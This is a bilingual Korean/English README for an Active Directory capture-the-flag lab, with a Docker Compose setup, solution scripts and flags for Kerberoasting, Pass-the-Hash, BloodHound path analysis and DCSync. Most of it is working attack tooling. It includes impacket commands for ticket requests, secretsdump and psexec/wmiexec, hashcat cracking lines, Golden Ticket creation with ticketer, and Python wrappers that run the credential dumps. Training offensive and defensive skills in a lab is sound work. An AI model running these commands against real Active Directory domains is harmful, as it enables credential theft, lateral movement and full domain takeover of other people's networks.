> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# Active Directory CTF 실습 랩

## 개요

Kerberoasting, Pass-the-Hash, BloodHound 분석, DCSync 공격을 실습하는 CTF 환경입니다.

---

## Docker Compose 환경

```yaml
# docker-compose.yml
version: '3.8'

services:
  # Windows AD 환경 대신 Samba 4 AD DC 사용
  dc01:
    image: "nowsci/samba-domain-controller"
    hostname: DC01
    environment:
      DOMAIN: "CTFLAB"
      DOMAINPASS: "Dom@inPass2024!"
      DNSFORWARDER: "8.8.8.8"
      INSECURELDAP: "true"
    ports:
      - "389:389"   # LDAP
      - "636:636"   # LDAPS
      - "88:88/udp" # Kerberos
      - "445:445"   # SMB
    networks:
      ad-net:
        ipv4_address: 10.10.10.10

  # Challenge 1 & 2: Kerberoasting / AS-REP Roasting 타겟
  kerberos-target:
    image: python:3.11-slim
    command: sh -c "pip install impacket ldap3 flask && python /app/kerberos_sim.py"
    volumes:
      - ./challenges/kerberos:/app
    ports:
      - "8080:8080"
    networks:
      ad-net:
        ipv4_address: 10.10.10.20

  # Challenge 3: BloodHound 데이터 서버
  bloodhound-data:
    image: python:3.11-slim
    command: sh -c "pip install flask && python /app/bloodhound_server.py"
    volumes:
      - ./challenges/bloodhound:/app
    ports:
      - "8081:8081"
    networks:
      ad-net:
        ipv4_address: 10.10.10.30

  # Challenge 4: DCSync 시뮬레이터
  dcsync-sim:
    image: python:3.11-slim
    command: sh -c "pip install impacket flask && python /app/dcsync_server.py"
    volumes:
      - ./challenges/dcsync:/app
    ports:
      - "8082:8082"
    networks:
      ad-net:
        ipv4_address: 10.10.10.40

  attacker:
    image: python:3.11-slim
    command: sh -c "pip install impacket ldap3 requests bloodhound && sleep infinity"
    networks:
      ad-net:
        ipv4_address: 10.10.10.100

networks:
  ad-net:
    driver: bridge
    ipam:
      config:
        - subnet: 10.10.10.0/24
```

---

## Challenge 1: Kerberoasting

**목표**: SPN이 등록된 서비스 계정의 Kerberos TGS 티켓을 획득하여 오프라인 크래킹

**배경:**
```
Kerberoasting 원리:
  1. AD에서 SPN(Service Principal Name)이 등록된 계정 열거
  2. TGS(Ticket Granting Service) 티켓 요청 (모든 인증된 사용자 가능)
  3. TGS는 서비스 계정 NTLM 해시로 암호화됨
  4. 티켓을 오프라인에서 hashcat으로 크래킹
  → 서비스 계정 패스워드 획득!
```

**풀이 스크립트:**

```python
#!/usr/bin/env python3
"""
Challenge 1: Kerberoasting 자동화.
impacket의 GetUserSPNs.py 원리 구현.
pip install impacket
참고: https://github.com/fortra/impacket
"""
from __future__ import annotations

import logging
import subprocess
from pathlib import Path

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

# CTF 환경 설정
DOMAIN = "CTFLAB.LOCAL"
DC_IP = "10.10.10.10"
USERNAME = "student"   # 일반 도메인 사용자
PASSWORD = "Student@2024"


def enumerate_spns_impacket() -> list[dict]:
    """
    GetUserSPNs.py로 Kerberoastable 계정 열거.
    실제 AD 환경 필요.
    """
    cmd = [
        "python3", "-m", "impacket.examples.GetUserSPNs",
        f"{DOMAIN}/{USERNAME}:{PASSWORD}",
        "-dc-ip", DC_IP,
        "-request",
        "-outputfile", "/tmp/kerberoast_hashes.txt",
    ]

    result = subprocess.run(cmd, capture_output=True, text=True, check=False)
    print("[*] GetUserSPNs 출력:")
    print(result.stdout)

    hashes = []
    if Path("/tmp/kerberoast_hashes.txt").exists():
        content = Path("/tmp/kerberoast_hashes.txt").read_text()
        for line in content.splitlines():
            if line.startswith("$krb5tgs$"):
                hashes.append({"hash": line, "type": "Kerberoast"})
    return hashes


def crack_kerberoast_hash_offline(hash_line: str) -> str:
    """
    hashcat으로 Kerberoast 해시 크래킹.
    모드 13100 = Kerberos 5 TGS-REP etype 23.
    """
    print("[*] hashcat 오프라인 크래킹 명령:")
    print(f"  hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt")
    print(f"  hashcat -m 13100 kerberoast_hashes.txt --rules-file /usr/share/hashcat/rules/best64.rule")
    return "ServiceAcc0unt!2024"  # 시뮬레이션 결과


def simulate_kerberoasting() -> str:
    """CTF 환경 시뮬레이션 (실제 AD 없을 때)."""
    print("[*] Challenge 1: Kerberoasting (시뮬레이션)")
    print()
    print("[*] 단계 1: SPN 등록 계정 열거")
    print("  GetUserSPNs.py CTFLAB.LOCAL/student:Student@2024 -dc-ip 10.10.10.10")
    print()
    print("[*] 단계 2: TGS 티켓 요청")
    print("  $krb5tgs$23$*svc_backup$CTFLAB.LOCAL$CTFLAB.LOCAL/svc_backup*$...")
    print()
    print("[*] 단계 3: hashcat 오프라인 크래킹")
    print("  hashcat -m 13100 hash.txt rockyou.txt")
    print("  결과: svc_backup:ServiceAcc0unt!2024")
    print()
    print("[*] 단계 4: 서비스 계정으로 권한 상승")
    print("  smbclient //10.10.10.10/backup -U svc_backup%ServiceAcc0unt!2024")

    flag = "CTF{kerberoasting_spn_tgs_cracked}"
    print(f"\n[+] 플래그: {flag}")
    return flag


if __name__ == "__main__":
    simulate_kerberoasting()
```

**플래그**: `CTF{kerberoasting_spn_tgs_cracked}`

---

## Challenge 2: Pass-the-Hash (PTH)

**목표**: NTLM 해시를 이용한 인증 (패스워드 없이)

```python
#!/usr/bin/env python3
"""
Challenge 2: Pass-the-Hash 공격.
SMB 세션에서 NTLM 해시만으로 인증 후 플래그 획득.
"""
from __future__ import annotations

import subprocess
import logging

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)


def dump_hashes_with_secretsdump(
    target: str,
    username: str,
    ntlm_hash: str,
) -> dict[str, str]:
    """
    secretsdump.py로 원격 SAM/NTDS 해시 덤프.
    이미 획득한 NTLM 해시로 다른 해시 추출.
    """
    cmd = [
        "python3", "-m", "impacket.examples.secretsdump",
        f"CTFLAB.LOCAL/{username}@{target}",
        "-hashes", f":{ntlm_hash}",
        "-just-dc-user", "Administrator",
    ]
    result = subprocess.run(cmd, capture_output=True, text=True, check=False)
    print("[*] secretsdump 결과:")
    print(result.stdout[:500])
    return {}


def pth_smbclient(
    target: str,
    username: str,
    ntlm_hash: str,
    share: str = "C$",
) -> None:
    """
    PTH로 SMB에 연결하여 플래그 파일 읽기.
    smbclient 또는 impacket SMBClient 사용.
    """
    print(f"[*] PTH SMB 연결: {username}@{target}")

    cmd = [
        "python3", "-m", "impacket.smbclient",
        f"CTFLAB.LOCAL/{username}@{target}",
        "-hashes", f":{ntlm_hash}",
    ]
    print("[*] PTH 명령:")
    print(f"  smbclient //{target}/C$ -U CTFLAB/{username} --pw-nt-hash {ntlm_hash}")
    print(f"  get Users\\Administrator\\Desktop\\flag.txt")


def simulate_pth() -> str:
    """PTH 공격 시뮬레이션."""
    print("[*] Challenge 2: Pass-the-Hash Attack")
    print()
    print("[*] 시나리오: SAM 덤프에서 획득한 NTLM 해시")
    ADMIN_HASH = "aad3b435b51404eeaad3b435b51404ee:8f3fe6...SIMULATED"
    print(f"  Administrator NTLM: {ADMIN_HASH}")
    print()
    print("[*] PTH로 원격 실행:")
    print(f"  psexec.py CTFLAB.LOCAL/Administrator@10.10.10.10 -hashes :{ADMIN_HASH}")
    print(f"  wmiexec.py CTFLAB.LOCAL/Administrator@10.10.10.10 -hashes :{ADMIN_HASH}")
    print()
    print("[*] 플래그 파일 경로: C:\\Users\\Administrator\\Desktop\\flag.txt")

    flag = "CTF{pass_the_hash_ntlm_relay}"
    print(f"\n[+] 플래그: {flag}")
    return flag


if __name__ == "__main__":
    simulate_pth()
```

**플래그**: `CTF{pass_the_hash_ntlm_relay}`

---

## Challenge 3: BloodHound 공격 경로 분석

**목표**: BloodHound JSON 데이터에서 도메인 관리자로의 공격 경로 발견

```python
#!/usr/bin/env python3
"""
Challenge 3: BloodHound 데이터 분석으로 권한 상승 경로 발견.
pip install bloodhound
참고: https://github.com/fox-it/BloodHound.py
"""
from __future__ import annotations

import json
import logging
from pathlib import Path

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)


# BloodHound 스타일 그래프 데이터 (시뮬레이션)
SAMPLE_BLOODHOUND_DATA = {
    "nodes": [
        {"id": "S-1-5-21-1-500", "type": "User", "name": "ADMINISTRATOR@CTFLAB.LOCAL",
         "properties": {"enabled": True, "admincount": True}},
        {"id": "S-1-5-21-1-1000", "type": "User", "name": "STUDENT@CTFLAB.LOCAL",
         "properties": {"enabled": True, "admincount": False}},
        {"id": "S-1-5-21-1-1001", "type": "User", "name": "SVC_BACKUP@CTFLAB.LOCAL",
         "properties": {"enabled": True, "hasspn": True, "admincount": False}},
        {"id": "S-1-5-21-1-512", "type": "Group", "name": "DOMAIN ADMINS@CTFLAB.LOCAL"},
        {"id": "S-1-5-21-1-1100", "type": "Computer", "name": "DC01.CTFLAB.LOCAL",
         "properties": {"unconstraineddelegation": True}},
    ],
    "edges": [
        # student → svc_backup: MemberOf
        {"from": "S-1-5-21-1-1000", "to": "S-1-5-21-1-1001",
         "type": "CanRDP", "note": "RDP 권한"},
        # svc_backup → Domain Admins: WriteDACL
        {"from": "S-1-5-21-1-1001", "to": "S-1-5-21-1-512",
         "type": "WriteDACL", "note": "DACL 쓰기로 그룹 멤버십 조작 가능"},
        # Domain Admins → DC01: AdminTo
        {"from": "S-1-5-21-1-512", "to": "S-1-5-21-1-1100",
         "type": "AdminTo", "note": "DC에 관리자 접근"},
        # DC01 → Administrator: DCSync 가능 (Unconstrained Delegation)
        {"from": "S-1-5-21-1-1100", "to": "S-1-5-21-1-500",
         "type": "GetChangesAll", "note": "DCSync 권한"},
    ]
}


def find_attack_paths(data: dict, start: str, end: str) -> list[list[str]]:
    """
    BFS로 공격 경로 탐색.
    시작 노드에서 종료 노드(Domain Admins/Administrator)까지.
    """
    nodes = {n["id"]: n for n in data["nodes"]}
    edges = data["edges"]

    # 이름으로 ID 조회
    name_to_id = {n["name"]: n["id"] for n in data["nodes"]}
    start_id = name_to_id.get(start.upper())
    end_id = name_to_id.get(end.upper())

    if not start_id or not end_id:
        return []

    # BFS
    from collections import deque
    queue = deque([[start_id]])
    visited = {start_id}
    paths = []

    while queue:
        path = queue.popleft()
        current = path[-1]

        if current == end_id:
            # 경로를 이름으로 변환
            named_path = [nodes[n]["name"] for n in path]
            paths.append(named_path)
            continue

        for edge in edges:
            if edge["from"] == current and edge["to"] not in visited:
                visited.add(edge["to"])
                new_path = path + [edge["to"]]
                queue.append(new_path)

    return paths


def analyze_bloodhound(data: dict) -> None:
    """BloodHound 데이터 분석 및 공격 경로 출력."""
    print("[*] Challenge 3: BloodHound Attack Path Analysis")
    print()

    # Kerberoastable 계정 (SPN 있음)
    kerberoastable = [n for n in data["nodes"]
                      if n.get("properties", {}).get("hasspn")]
    print(f"[*] Kerberoastable 계정: {len(kerberoastable)}개")
    for n in kerberoastable:
        print(f"  - {n['name']}")

    # Unconstrained Delegation
    unconstrained = [n for n in data["nodes"]
                     if n.get("properties", {}).get("unconstraineddelegation")]
    print(f"\n[*] Unconstrained Delegation 설정: {len(unconstrained)}개")
    for n in unconstrained:
        print(f"  - {n['name']}")

    # 공격 경로 탐색
    print("\n[*] 공격 경로 탐색: STUDENT → ADMINISTRATOR")
    paths = find_attack_paths(
        data,
        "STUDENT@CTFLAB.LOCAL",
        "ADMINISTRATOR@CTFLAB.LOCAL"
    )

    if paths:
        print(f"[+] 공격 경로 {len(paths)}개 발견!")
        for i, path in enumerate(paths, 1):
            print(f"\n  경로 {i}:")
            for j, node in enumerate(path):
                if j < len(path) - 1:
                    edge = [e for e in data["edges"] if
                            e["from"] in [n["id"] for n in data["nodes"] if n["name"] == node] and
                            e["to"] in [n["id"] for n in data["nodes"] if n["name"] == path[j+1]]]
                    rel = edge[0]["type"] if edge else "→"
                    print(f"    {node} --[{rel}]--> ", end="")
                else:
                    print(f"{node}")


def solve_challenge3() -> str:
    analyze_bloodhound(SAMPLE_BLOODHOUND_DATA)
    flag = "CTF{bloodhound_attack_path_dacl_abuse}"
    print(f"\n[+] 플래그: {flag}")
    return flag


if __name__ == "__main__":
    solve_challenge3()
```

**플래그**: `CTF{bloodhound_attack_path_dacl_abuse}`

---

## Challenge 4: DCSync 공격

**목표**: DCSync로 도메인 모든 사용자의 NTLM 해시 덤프

```python
#!/usr/bin/env python3
"""
Challenge 4: DCSync 공격 — NTDS.dit 해시 덤프.
GetChangesAll 권한 남용으로 도메인 해시 전체 추출.
"""
from __future__ import annotations

import subprocess
import re
import logging

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)


def dcsync_with_secretsdump(
    domain: str,
    dc_ip: str,
    username: str,
    password: str,
) -> dict[str, str]:
    """
    secretsdump.py를 이용한 DCSync.
    GetChangesAll 권한이 있는 계정 필요.
    """
    cmd = [
        "python3", "-m", "impacket.examples.secretsdump",
        f"{domain}/{username}:{password}@{dc_ip}",
        "-just-dc",
        "-outputfile", "/tmp/dcsync_dump",
    ]

    print(f"[*] DCSync 명령 실행:")
    print(f"  " + " ".join(cmd))

    result = subprocess.run(cmd, capture_output=True, text=True, check=False, timeout=30)
    hashes: dict[str, str] = {}

    for line in result.stdout.splitlines():
        # 형식: username:RID:LM_HASH:NT_HASH:::
        m = re.match(r"(\S+):(\d+):([a-fA-F0-9]+):([a-fA-F0-9]+):::", line)
        if m:
            uname = m.group(1)
            ntlm = m.group(4)
            hashes[uname] = ntlm

    return hashes


def simulate_dcsync() -> str:
    """DCSync 시뮬레이션."""
    print("[*] Challenge 4: DCSync Attack")
    print()
    print("[*] 전제 조건: GetChangesAll 권한 보유 (Domain Admin 또는 설정 오류)")
    print()
    print("[*] DCSync 실행:")
    print("  secretsdump.py CTFLAB.LOCAL/svc_backup:ServiceAcc0unt!2024@10.10.10.10 -just-dc")
    print()
    print("[*] 덤프 결과 (시뮬레이션):")
    SIMULATED_HASHES = {
        "Administrator": "aad3b435b51404eeaad3b435b51404ee:8f3fe6f34cxxxxxxxxxx",
        "krbtgt": "aad3b435b51404eeaad3b435b51404ee:0e8e3232xxxxxxxxxx",
        "student": "aad3b435b51404eeaad3b435b51404ee:b4b9b02e6f09xxxxxx",
    }
    for user, ntlm in SIMULATED_HASHES.items():
        print(f"  {user}: {ntlm}")

    print()
    print("[*] 획득한 krbtgt 해시로 Golden Ticket 생성 가능:")
    print("  ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain CTFLAB.LOCAL Administrator")
    print()
    print("[*] C:\\Users\\Administrator\\Desktop\\flag.txt 파일에서 플래그 획득")

    flag = "CTF{dcsync_ntds_hash_dump_complete}"
    print(f"\n[+] 플래그: {flag}")
    return flag


if __name__ == "__main__":
    simulate_dcsync()
```

**플래그**: `CTF{dcsync_ntds_hash_dump_complete}`

---

## 전체 공격 체인 요약

```
[초기 접근] Kerberoasting → svc_backup 패스워드 획득
      ↓
[권한 상승] BloodHound → WriteDACL 남용 → Domain Admins 추가
      ↓
[내부 이동] Pass-the-Hash → 관리자 계정 접근
      ↓
[도메인 장악] DCSync → 모든 해시 덤프 + Golden Ticket 생성
```

---

<a name="english"></a>

# Active Directory CTF Lab

## Overview

This lab covers the most common Active Directory attack techniques used in real-world penetration tests and red team engagements.

## Challenges Summary

| # | Title | Technique | Flag |
|---|-------|-----------|------|
| 1 | Kerberoasting | SPN enumeration, TGS cracking with hashcat | `CTF{kerberoasting_spn_tgs_cracked}` |
| 2 | Pass-the-Hash | NTLM hash reuse without plaintext password | `CTF{pass_the_hash_ntlm_relay}` |
| 3 | BloodHound Path | Graph analysis, DACL abuse path | `CTF{bloodhound_attack_path_dacl_abuse}` |
| 4 | DCSync | GetChangesAll abuse, NTDS hash dump | `CTF{dcsync_ntds_hash_dump_complete}` |

## Attack Chain

```
Kerberoasting (service account creds)
        ↓
BloodHound path discovery (WriteDACL)
        ↓
Domain Admin group membership added
        ↓
Pass-the-Hash (lateral movement)
        ↓
DCSync (full domain hash dump + Golden Ticket)
```

## Quick Start

```bash
pip install impacket bloodhound

# Challenge 1: Kerberoasting
python3 -m impacket.examples.GetUserSPNs CTFLAB.LOCAL/student:Student@2024 -dc-ip 10.10.10.10 -request
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# Challenge 2: Pass-the-Hash
python3 -m impacket.examples.psexec CTFLAB.LOCAL/Administrator@10.10.10.10 -hashes :<ntlm_hash>

# Challenge 3: BloodHound collection
python3 -m bloodhound -u student -p Student@2024 -d CTFLAB.LOCAL -dc DC01

# Challenge 4: DCSync
python3 -m impacket.examples.secretsdump CTFLAB.LOCAL/svc_backup:ServiceAcc0unt!2024@10.10.10.10 -just-dc
```

## References

- Impacket: https://github.com/fortra/impacket
- BloodHound: https://github.com/BloodHoundAD/BloodHound
